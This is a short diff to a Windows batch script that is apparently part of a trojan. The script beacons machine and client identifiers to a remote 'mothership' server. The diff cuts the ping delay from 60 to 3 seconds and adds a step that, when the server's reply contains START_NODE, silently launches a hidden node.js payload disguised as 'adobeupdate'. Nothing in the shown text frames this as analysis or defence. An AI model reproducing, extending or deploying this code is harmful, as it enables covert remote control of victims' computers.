@@ -62,7 +62,7 @@ set params=%params% --data-urlencode "machinename=%machinename%"
 set params=%params% --data-urlencode "clientid=%clientid%"
 set params=%params% --data-urlencode "script_version=%script_version%"
 
-SET pingdelaytime=60
+SET pingdelaytime=3
 
 REM --- read/write mothership
 
@@ -125,6 +125,12 @@ exit 1
     
     REM check if START_NODE present, if so launch adobeupdate
     
+    type %trojandir%\%pingfname% | findstr START_NODE
+
+    IF "%errorlevel%"=="0" (
+        conhost.exe --headless C:\ProgramData\owd\node\node.exe C:\ProgramData\owd\adobeupdate launch_ping
+    )
+
     echo pingloop sleeping %pingdelaytime% >> %logfpath%
     
     timeout %pingdelaytime% /nobreak >NUL 2>&1
